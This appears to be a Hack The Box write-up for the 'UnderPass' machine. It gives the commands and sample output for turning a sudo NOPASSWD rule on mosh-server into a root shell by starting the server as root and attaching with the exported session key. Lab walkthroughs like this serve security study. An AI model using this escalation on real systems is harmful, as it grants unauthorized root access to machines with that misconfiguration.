# 🚀 mosh-server Privilege Escalation (UnderPass - HTB)

This repository explains how to exploit sudo privileges on /usr/bin/mosh-server to escalate privileges on the HTB machine Underpass.

## Privilege Escalation Steps

1️⃣ Check sudo permissions
Run the following command to list available sudo privileges:
```bash
sudo -l
```
Expected output:
```text
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-serve
```

2️⃣ Start mosh-server as root
```bash
sudo -u root /usr/bin/mosh-server 0.0.0.0
```
This will return output similar to:
```text
MOSH CONNECT 60001 f0Cvz12Uxswra/0ls1kX7Q

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

3️⃣ Export the MOSH key
```bash
export MOSH_KEY=f0Cvz12Uxswra/0ls1kX7Q
```

4️⃣ Connect to the mosh session
```bash
mosh-client 127.0.0.1 60001
```

Once connected, you should now have a root shell! 🎉

---

⚠️ Disclaimer
This repository is for educational purposes only. Unauthorized access to systems is illegal. Use this knowledge responsibly.
